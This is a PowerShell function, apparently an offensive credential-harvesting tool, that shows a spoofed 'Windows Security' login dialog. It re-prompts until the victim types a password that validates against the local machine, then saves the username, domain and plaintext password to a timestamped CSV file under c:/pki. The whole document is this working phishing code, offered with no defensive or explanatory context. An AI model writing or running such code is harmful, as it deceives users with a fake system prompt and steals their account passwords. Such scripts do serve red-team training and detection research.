function Invoke-LoginPrompt {
    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    
    while($DS.ValidateCredentials("$full", "$password") -ne $True) {
        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
        $username = "$env:username"
        $domain = "$env:userdomain"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $DS.ValidateCredentials("$full", "$password") | Out-Null
    }
     
    $output = $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password

    $path = "c:/pki"
    if (-not (Test-Path -Path $path)) {
        New-Item -ItemType Directory -Path $path | Out-Null
    }

    $dateTime = Get-Date -Format "yyyyMMddHHmmss"
    $fileName = "$dateTime" + ".txt"
    $filePath = Join-Path -Path $path -ChildPath $fileName
    $output | Export-Csv -Path $filePath -NoTypeInformation
}